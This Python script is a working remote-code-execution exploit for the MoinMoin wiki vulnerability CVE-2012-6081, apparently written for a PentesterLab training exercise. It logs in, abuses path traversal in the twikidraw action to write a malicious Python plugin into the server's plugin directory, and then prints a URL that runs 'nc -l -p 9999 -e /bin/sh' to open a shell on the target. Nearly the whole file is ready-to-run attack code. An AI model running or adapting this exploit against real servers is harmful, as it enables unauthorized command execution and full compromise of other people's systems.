import requests
import argparse
import re
from bs4 import BeautifulSoup

'''
Run exploit:
    python moinmoin.py 172.16.230.169 80 secretuser password

Don't forget to delete moinexec.py plugin in /var/lib/moin/mywiki/data/plugin/action/
remote shell exploit for moinmoin vulnerability(CVE-2012-6081)
references:
https://www.exploit-db.com/exploits/25304/
https://www.pentesterlab.com/exercises/cve-2012-6081/course
'''

class moinmoin():	
    def __init__(self,server,url,port,user,password):
        self.username = user
        self.password = password
        self.logincred = {'name':self.username,'password':self.password,'action':'login','login':'Login'}
        self.session = requests.session()
        self.jar = {}
        self.server = server
        self.url = url
        self.port = port
        self.ticket = ''
        self._login()
        self._getTicket()

    def _login(self):
        self.session.post(self._constructUrl('/moin'),data=self.logincred)
        self.jar = self.session.cookies

    def _constructUrl(self,url):
        return 'http://'+self.server+url

    def _getTicket(self):
        '''
        get ticket number for drawing
        '''
        url = '/moin/secretuser?action=twikidraw&do=modify&target=../../../../data/plugin/action/moinexec.py'
        url = self._constructUrl(url)
        resp = self.session.get(url,cookies=self.jar)
        soup = BeautifulSoup(resp.text,'html.parser')
        sav = soup.find('param',{'name':'savepath'})
        result = str(sav).replace('amp;','')
        #print(result)
        m = re.match('(.*?)&target\=',result)
        result = m.group(1)
        ticket = result.split('=')[-1]
        self.ticket = ticket
        print('got ticket number: {}'.format(ticket))
        return ticket

    def exploit(self,expose=9999):
        filepath = "..%2F..%2F..%2F..%2Fdata%2Fplugin%2Faction%2Fmoinexec.py"
        payload = "drawing.r if()else[]\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\""
        url = "http://{}/moin/secretuser?action=twikidraw&do=save&ticket={}&target={}".format(self.server,self.ticket,filepath)
        headers = {}
        headers['Content-Type'] = 'multipart/form-data; boundary=89692781418184'
        body =  "\r\n\r\n--89692781418184\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n%s\r\n"%(payload) +\
                "--89692781418184\r\nContent-Disposition: form-data; name=\"filepath\"; filename=\"drawing.png\"\r\n"+\
                "Content-Type: image/png\r\n\r\n moin \r\n"+\
                "--89692781418184--"
        resp = self.session.post(url,headers=headers,data=body)
        print(resp.text)
        if (resp.status_code == 200):
            print('Exploit succeed')
            print('go to:\n\nhttp://{}/moin/{}?action=moinexec&c=nc%20-l%20-p%20{}%20-e%20/bin/sh\n\nto spawn a remote shell at the server'.format(self.server,self.username,expose))
            print('connect to remote shell by:\n\nnc {} {}'.format(self.server,expose))
        else:
            print('exploit failed...')

        

if __name__ == '__main__':
    '''
    python moinmoin.py 172.16.230.169 80 secretuser password
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument('target',help='specify target server address')
    parser.add_argument('port',help='specify target port number')
    parser.add_argument('user',help='specify wiki username')
    parser.add_argument('userpass',help='specify wiki user password')
    args = parser.parse_args()
    server = args.target
    port = args.port
    user = args.user
    userpass = args.userpass
    shellport = 9999
    moin = moinmoin(server=server,url=None,port=port,user=user,password=userpass)
    moin.exploit(expose=shellport)
